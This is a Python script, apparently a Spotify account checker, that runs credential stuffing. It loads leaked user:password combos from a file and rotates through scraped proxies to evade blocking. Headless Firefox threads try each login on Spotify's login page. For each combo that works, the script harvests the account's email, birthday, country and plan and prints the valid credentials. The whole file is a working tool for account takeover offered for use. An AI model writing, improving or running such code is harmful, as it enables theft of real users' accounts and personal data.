from selenium import webdriver
from selenium.webdriver.firefox.options import Options
from selenium.webdriver.common.by import By
from selenium.webdriver.common.proxy import Proxy, ProxyType
from selenium.webdriver.support.ui import WebDriverWait
from selenium.webdriver.support import expected_conditions as EC
from selenium.common.exceptions import TimeoutException

from bs4 import BeautifulSoup

import threading
import queue
import sys

from scraper import Scraper
                    
class Checker(threading.Thread):
    def __init__(self, q, proxy_str, *args, **kwargs):
        self.q = q
        super().__init__(*args, **kwargs)

        proxy = Proxy({
            'proxyType': ProxyType.MANUAL,
            'httpProxy': proxy_str,
            'ftpProxy': proxy_str,
            'sslProxy': proxy_str,
            'noProxy': ''
            })

        options = Options()
        options.headless = True
        self.driver = webdriver.Firefox(proxy=proxy, options=options)

        
    def run(self):
        while True:
            try:
                combo = self.q.get(timeout=3)  # 3s timeout
            except queue.Empty:
                return

            # do whatever work you have to do on work
            user, password = combo.split(":")
            self.check(user.strip(), password.strip())
            self.q.task_done()
    
    def check(self, user, password):
        self.driver.get("https://accounts.spotify.com/en/login/?continue=https:%2F%2Fwww.spotify.com%2Fus%2Faccount%2Foverview%2F")
        user_element = self.driver.find_element_by_id("login-username")
        password_element = self.driver.find_element_by_id("login-password")
        button_element = self.driver.find_element_by_id("login-button")

        user_element.clear()
        password_element.clear()

        user_element.send_keys(user)
        password_element.send_keys(password)
        button_element.click()

        # wait 10s for error message or redirection to overview
        try:
            WebDriverWait(self.driver, 10).until(EC.presence_of_element_located((By.XPATH, "//*[@ng-if='response.error' or @id='your-plan']")))
        except TimeoutException:
            print("Timed out waiting for response")
            
        finally:
            error_msg = self.driver.find_element_by_xpath("//*[@ng-if='response.error' or @id='your-plan']").get_attribute('innerHTML')
            # incorrect credential
            if error_msg == "Incorrect username or password.":
                print(user+':'+password, "| Incorrect username or password.")
            # correct credential
            elif self.driver.current_url == "https://www.spotify.com/us/account/overview/" :
                parser = BeautifulSoup(self.driver.page_source, 'html.parser')

                profile  = parser.find_all("td", "iHaOcn")
                username = profile[0].get_text()
                email    = profile[1].get_text()
                birthday = profile[2].get_text()
                country  = profile[3].get_text()
                plan     =  parser.find_all("span", "ktdUVV")[0].get_text()

                
                print(user+':'+password, "| Country =", country, "| Plan =", plan)
            #else :
                #print("Unexpected error")

        # reset session
        self.driver.delete_all_cookies()


class Entry:
    def __init__(self):

        print("Loading Combo ...")
        q = queue.Queue()
        with open(sys.argv[1], 'r') as combo_list:
            for combo in combo_list:
                q.put_nowait(combo)

        print("Proxy scraping ...")
        proxies = Scraper(protocol='SSL', size=10).get()
        print(proxies.qsize(),"Proxies")
        print("Loading Drivers ...")
        while not proxies.empty():
            Checker(q, proxies.get()).start()
        
        #q.join()

if __name__ == '__main__':
    Entry()